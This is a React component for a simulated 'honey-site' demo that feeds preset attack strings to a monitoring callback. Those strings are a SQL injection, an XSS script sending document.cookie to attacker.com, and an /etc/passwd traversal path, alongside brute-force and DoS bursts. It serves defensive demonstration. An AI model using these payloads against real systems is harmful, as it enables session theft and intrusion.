'use client';

import React, { useState } from 'react';
import { Shield, ShieldAlert, Key, Search, Send, AlertTriangle, CheckCircle, Zap } from 'lucide-react';

interface HoneySiteProps {
  onActivityDetected: (
    ip: string,
    endpoint: string,
    method: 'GET' | 'POST' | 'PUT' | 'DELETE',
    payload: string
  ) => void;
}

export function HoneySite({ onActivityDetected }: HoneySiteProps) {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [searchQuery, setSearchQuery] = useState('');
  const [feedback, setFeedback] = useState<string | null>(null);

  const simulateClientIp = '192.168.1.104';

  const handleLoginSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const payload = `username=${username}&password=${password}`;
    onActivityDetected(simulateClientIp, '/api/v1/auth/login', 'POST', payload);
    setFeedback('Authentication Request Sent.');
    setTimeout(() => setFeedback(null), 3000);
  };

  const handleSearchSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    onActivityDetected(simulateClientIp, `/search?q=${encodeURIComponent(searchQuery)}`, 'GET', searchQuery);
    setFeedback(`Executed Query search on product index.`);
    setTimeout(() => setFeedback(null), 3000);
  };

  const triggerPresetAttack = (type: string) => {
    switch (type) {
      case 'SQLi':
        onActivityDetected(simulateClientIp, '/api/v1/users', 'POST', "username=admin' OR '1'='1'--&pass=123");
        setFeedback('🚨 Injected SQL vulnerability attack simulation payload.');
        break;
      case 'XSS':
        onActivityDetected(simulateClientIp, '/api/v1/comments', 'POST', "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>");
        setFeedback('🚨 Injected XSS malicious payload script into portal form.');
        break;
      case 'BruteForce':
        for (let i = 0; i < 4; i++) {
          onActivityDetected(simulateClientIp, '/api/v1/auth/login', 'POST', `username=admin&password=pass${i}`);
        }
        setFeedback('🚨 Triggered 4 rapid failed login attempts (Brute Force simulation).');
        break;
      case 'DoS':
        for (let i = 0; i < 8; i++) {
          onActivityDetected(simulateClientIp, '/api/v1/resource/data', 'GET', `request_burst=${i}`);
        }
        setFeedback('🚨 Triggered sudden high-frequency request burst (Volumetric DoS simulation).');
        break;
      case 'Traversal':
        onActivityDetected(simulateClientIp, '/download?file=../../../../etc/passwd', 'GET', 'path=../../../../etc/passwd');
        setFeedback('🚨 Injected Directory Traversal string attempt.');
        break;
    }
    setTimeout(() => setFeedback(null), 4000);
  };

  return (
    <div className="bg-slate-900 border border-slate-800 rounded-xl p-6 shadow-2xl text-slate-100">
      <div className="flex items-center justify-between border-b border-slate-800 pb-4 mb-6">
        <div className="flex items-center gap-3">
          <div className="p-2.5 bg-blue-500/10 rounded-lg text-blue-400 border border-blue-500/20">
            <Zap className="w-5 h-5" />
          </div>
          <div>
            <h2 className="text-lg font-bold">Simulated E-Commerce Web App</h2>
            <p className="text-xs text-slate-400">Honey-Site environment capturing client conduct telemetry</p>
          </div>
        </div>
        <span className="px-2.5 py-1 text-xs font-semibold rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 flex items-center gap-1.5">
          <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
          Live Monitoring Active
        </span>
      </div>

      {feedback && (
        <div className="mb-4 p-3 rounded-lg bg-blue-950/80 border border-blue-800 text-blue-200 text-xs flex items-center gap-2 animate-fadeIn">
          <CheckCircle className="w-4 h-4 text-blue-400 shrink-0" />
          {feedback}
        </div>
      )}

      {/* Simulated Interactive Features */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
        {/* Login Form */}
        <form onSubmit={handleLoginSubmit} className="bg-slate-950/60 p-4 rounded-lg border border-slate-800/80 space-y-3">
          <div className="flex items-center gap-2 text-sm font-semibold text-slate-300">
            <Key className="w-4 h-4 text-cyan-400" />
            User Login Portal
          </div>
          <div>
            <label className="text-xs text-slate-400">Username / Email</label>
            <input
              type="text"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              placeholder="e.g. user@domain.com or admin'--"
              className="w-full mt-1 bg-slate-900 border border-slate-700/80 rounded px-3 py-1.5 text-xs text-slate-200 focus:outline-none focus:border-cyan-500"
            />
          </div>
          <div>
            <label className="text-xs text-slate-400">Password</label>
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Password"
              className="w-full mt-1 bg-slate-900 border border-slate-700/80 rounded px-3 py-1.5 text-xs text-slate-200 focus:outline-none focus:border-cyan-500"
            />
          </div>
          <button
            type="submit"
            className="w-full py-1.5 bg-cyan-600 hover:bg-cyan-500 text-white rounded text-xs font-semibold transition-colors flex items-center justify-center gap-1.5"
          >
            <Send className="w-3.5 h-3.5" /> Submit Credentials
          </button>
        </form>

        {/* Search Portal */}
        <form onSubmit={handleSearchSubmit} className="bg-slate-950/60 p-4 rounded-lg border border-slate-800/80 space-y-3 flex flex-col justify-between">
          <div>
            <div className="flex items-center gap-2 text-sm font-semibold text-slate-300 mb-3">
              <Search className="w-4 h-4 text-cyan-400" />
              Catalog Search Bar
            </div>
            <label className="text-xs text-slate-400">Search Products</label>
            <input
              type="text"
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              placeholder="e.g. Laptop or <script>alert(1)</script>"
              className="w-full mt-1 bg-slate-900 border border-slate-700/80 rounded px-3 py-1.5 text-xs text-slate-200 focus:outline-none focus:border-cyan-500"
            />
          </div>
          <button
            type="submit"
            className="w-full py-1.5 bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 rounded text-xs font-semibold transition-colors"
          >
            Execute Product Query
          </button>
        </form>
      </div>

      {/* Quick Attack Simulator Buttons for Demo */}
      <div className="pt-4 border-t border-slate-800">
        <div className="flex items-center gap-2 text-xs font-semibold text-slate-400 mb-3">
          <ShieldAlert className="w-4 h-4 text-amber-400" />
          Quick Attack Vector Simulators (Instant Demonstration)
        </div>
        <div className="flex flex-wrap gap-2">
          <button
            onClick={() => triggerPresetAttack('SQLi')}
            className="px-3 py-1.5 bg-red-950/40 border border-red-800/60 hover:bg-red-900/60 text-red-300 rounded text-xs font-medium transition"
          >
            SQL Injection Attack
          </button>
          <button
            onClick={() => triggerPresetAttack('XSS')}
            className="px-3 py-1.5 bg-orange-950/40 border border-orange-800/60 hover:bg-orange-900/60 text-orange-300 rounded text-xs font-medium transition"
          >
            XSS Script Attack
          </button>
          <button
            onClick={() => triggerPresetAttack('BruteForce')}
            className="px-3 py-1.5 bg-purple-950/40 border border-purple-800/60 hover:bg-purple-900/60 text-purple-300 rounded text-xs font-medium transition"
          >
            Brute Force Auth
          </button>
          <button
            onClick={() => triggerPresetAttack('DoS')}
            className="px-3 py-1.5 bg-pink-950/40 border border-pink-800/60 hover:bg-pink-900/60 text-pink-300 rounded text-xs font-medium transition"
          >
            Volumetric DoS Burst
          </button>
          <button
            onClick={() => triggerPresetAttack('Traversal')}
            className="px-3 py-1.5 bg-yellow-950/40 border border-yellow-800/60 hover:bg-yellow-900/60 text-yellow-300 rounded text-xs font-medium transition"
          >
            Directory Traversal
          </button>
        </div>
      </div>
    </div>
  );
}
